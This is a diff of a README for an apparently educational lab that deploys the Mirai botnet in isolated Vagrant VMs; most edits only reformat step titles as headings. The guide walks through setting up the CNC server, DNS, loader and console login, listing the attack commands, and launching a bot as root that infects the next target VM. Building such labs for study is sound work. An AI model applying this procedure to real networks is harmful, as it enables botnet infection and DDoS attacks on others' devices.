@@ -44,7 +44,7 @@ Leverage Vagrant to deploy the 2 types of VMs
 ### Build and Launch VMs
 First of all, clone Github repository and enter the project home directory.
 
-Clone Github Repository
+##### Clone Github Repository
 ```
     git clone https://github.com/stanleyshuang/ima2.git
     cd ima2
@@ -54,20 +54,20 @@ Because the build script needs specific environment variables, select or create 
 
  For example, an isolated network built for develop the environment can be specified as  
 
-Set Environment Variables
+##### Set Environment Variables
 ```
     source ./_build/runes-1-qnapxizhi-buffalo/env.sh
 ```
 
 To look at the environment variables, they include
 
-1. ni: the name of network interface, It is usually the network interface which connects to the router or gateway of the host machine running VMs ("en6: USB 10/100/1000 LAN" in the example of "runes-1-qnapxizhi-buffalo")
-2. ip_prx: the first 3 sections of the IPv4 network, In this example, the router hosts a network of 192.168.11.0/8. ("192.168.11" in the example of "runes-1-qnapxizhi-buffalo")
-3. cnc_ip" the IP of CNC server, the IP of the CNC server. It would be associated with domain name, "cnc.mirai,.com", in the built-in DNS server, so that bots could find the CNC with the specific domain name. ("192.168.11.11" in the example of "runes-1-qnapxizhi-buffalo")
-4. tgt_psz: the 4th section of IP of the first target VM, In other words, take this example, the IP of the first target VM would be 192.168.0.30. The second one would be 192.168.0.31. Then, the third one would be 192.168.0.32, and so on. ("30" in the example of "runes-1-qnapxizhi-buffalo")
+1. **ni: the name of network interface**, It is usually the network interface which connects to the router or gateway of the host machine running VMs ("en6: USB 10/100/1000 LAN" in the example of "runes-1-qnapxizhi-buffalo")
+2. **ip_prx: the first 3 sections of the IPv4 network**, In this example, the router hosts a network of 192.168.11.0/8. ("192.168.11" in the example of "runes-1-qnapxizhi-buffalo")
+3. **cnc_ip" the IP of CNC server**, the IP of the CNC server. It would be associated with domain name, "cnc.mirai,.com", in the built-in DNS server, so that bots could find the CNC with the specific domain name. ("192.168.11.11" in the example of "runes-1-qnapxizhi-buffalo")
+4. **tgt_psz: the 4th section of IP of the first target VM**, In other words, take this example, the IP of the first target VM would be 192.168.0.30. The second one would be 192.168.0.31. Then, the third one would be 192.168.0.32, and so on. ("30" in the example of "runes-1-qnapxizhi-buffalo")
 To verify the correctness, echo the environment variables to see if set successfully or not
 
-Verify Environment Variables
+##### Verify Environment Variables
 ```
     echo $ni
     > en6: USB 10/100/1000 LAN
@@ -75,7 +75,7 @@ Verify Environment Variables
 
 Compile all necessary binaries and instantiate the Vagrant VMs.
 
-Build VMs
+##### Build VMs
 ```
     ./build.sh
 ```
@@ -95,7 +95,7 @@ On VM host machine, set the DNS server settings to make "cnc.mirai.com" taking e
 
 Before set this ping cnc.mirai.com is not working.
 
-Before Set DNS
+##### Before Set DNS
 ```
     ping cnc.mirai.com
     > ping: cannot resolve cnc.mirai.com: Unknown host
@@ -103,7 +103,7 @@ Before Set DNS
 
 After set up DNS, ping cnc.mirai.com works well.
 
-Before Set DNS
+##### Before Set DNS
 ```
     ping cnc.mirai.com
     > PING cnc.mirai.com (192.168.11.11): 56 data bytes
@@ -115,7 +115,7 @@ Before Set DNS
 ### Run CNC Server and Loader
 Launch CNC Server and loader with the following command.
 
-Run CNC server and loader
+##### Run CNC server and loader
 ```
     ./run_cnc_and_loader.sh
     > Starting mirai cnc and loader...
@@ -145,7 +145,7 @@ Username: mirai
 
 Password: password
 
-Login Mirai CNC Console
+##### Login Mirai CNC Console
 ```
     telnet cnc.mirai.com
 ```
@@ -156,7 +156,7 @@ Login Mirai CNC Console
 
 After login in successfully, check attack commands. Type "?" to see the available commends.
 
-Check Attack Commands
+##### Check Attack Commands
 ```
     mirai>> ?
     Available attack list
@@ -178,7 +178,7 @@ Simulate a bot to infect a target VM.
 
 Open another bash console. SSH target_0 VM.
 
-SSH Target_0
+##### SSH Target_0
 ```
     cd ima2
     source ./_build/runes-1-qnapxizhi-buffalo/env.sh
@@ -199,7 +199,7 @@ SSH Target_0
 
 Check IP. In this example, it should be 192.168.11.30
 
-Check IP
+##### Check IP
 ```
     target-0:~$ ifconfig
     eth0      Link encap:Ethernet  HWaddr 08:00:27:8B:46:C3
@@ -234,7 +234,7 @@ Check IP
 
 Launch bot. Be sure running in root permission. The customized bot would connect to CNC server back then try to infect the next IP. In other words, 192.168.11.31, which is target_1 in this example.
 
-Launch Bot
+##### Launch Bot
 ```
     target-0:~$ sudo -i
     target-0:~# whoami
@@ -285,7 +285,7 @@ Launch Bot
 
 Back to CNC console, a bot, target_0, connecting to CNC could be observed.
 
-Mirai Console Command botcount
+##### Mirai Console Command botcount
 ```
     mirai>> botcount
     :   1
